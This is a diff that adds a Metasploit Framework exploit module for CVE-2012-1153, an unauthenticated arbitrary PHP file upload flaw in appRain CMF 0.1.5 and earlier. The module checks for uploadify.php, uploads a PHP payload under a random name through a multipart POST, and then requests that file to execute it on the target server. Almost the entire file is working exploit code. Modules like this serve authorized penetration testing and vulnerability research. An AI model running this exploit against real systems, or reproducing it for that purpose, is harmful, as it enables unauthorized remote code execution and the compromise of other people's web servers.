@@ -1,0 +1,118 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "appRain CMF Arbitrary PHP File Upload Vulnerability",
+			'Description'    => %q{
+					This module exploits a vulnerability found in appRain's Content Management
+				Framework (CMF), version 0.1.5 or less.  By abusing the uploadify.php file, a
+				malicious user can upload a file to the uploads/ directory without any
+				authentication, which results in arbitrary code execution.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'EgiX',   #Discovery, PoC
+					'sinn3r'  #Metasploit
+				],
+			'References'     =>
+				[
+					['CVE', '2012-1153'],
+					['OSVDB', '78473'],
+					['EDB', '18392']
+				],
+			'Payload'        =>
+				{
+					'BadChars' => "\x00"
+				},
+			'DefaultOptions'  =>
+				{
+					'ExitFunction' => "none"
+				},
+			'Platform'       => ['php'],
+			'Arch'           => ARCH_PHP,
+			'Targets'        =>
+				[
+					['appRain 0.1.5 or less', {}]
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => "Jan 19 2012",
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('TARGETURI', [true, 'The base path to appRain', '/appRain-q-0.1.5'])
+				], self.class)
+	end
+
+	def check
+		uri = target_uri.path
+		uri << '/' if uri[-1,1] != '/'
+
+		res = send_request_cgi({
+			'method' => 'GET',
+			'uri'    => "#{uri}addons/uploadify/uploadify.php"
+		})
+
+		if res and res.code == 200 and res.body.empty?
+			return Exploit::CheckCode::Detected
+		else
+			return Exploit::CheckCode::Safe
+		end
+	end
+
+	def exploit
+		uri = target_uri.path
+		uri << '/' if uri[-1,1] != '/'
+
+		peer = "#{rhost}:#{rport}"
+		payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + '.php'
+
+		post_data = "--o0oOo0o\r\n"
+		post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
+		post_data << "<?php "
+		post_data << payload.encoded
+		post_data << " ?>\r\n"
+		post_data << "--o0oOo0o\r\n"
+
+		print_status("#{peer} - Sending PHP payload (#{payload_name})")
+		res = send_request_cgi({
+			'method' => 'POST',
+			'uri'    => "#{uri}addons/uploadify/uploadify.php",
+			'ctype'  => 'multipart/form-data; boundary=o0oOo0o',
+			'data'   => post_data
+		})
+
+		# If the server returns 200 and the body contains our payload name,
+		# we assume we uploaded the malicious file successfully
+		if not res or res.code != 200 or res.body !~ /#{payload_name}/
+			print_error("#{peer} - I don't think the file was uploaded. Abort!")
+			return
+		end
+
+		print_status("#{peer} - Executing PHP payload (#{payload_name})")
+		# Execute our payload
+		res = send_request_cgi({
+			'method' => 'GET',
+			'uri'    => "#{uri}addons/uploadify/uploads/#{payload_name}"
+		})
+
+		# If we don't get a 200 when we request our malicious payload, we suspect
+		# we don't have a shell, either.  Print the status code for debugging purposes.
+		if res and res.code != 200
+			print_status("#{peer} - Server returns #{res.code.to_s}")
+		end
+	end
+end
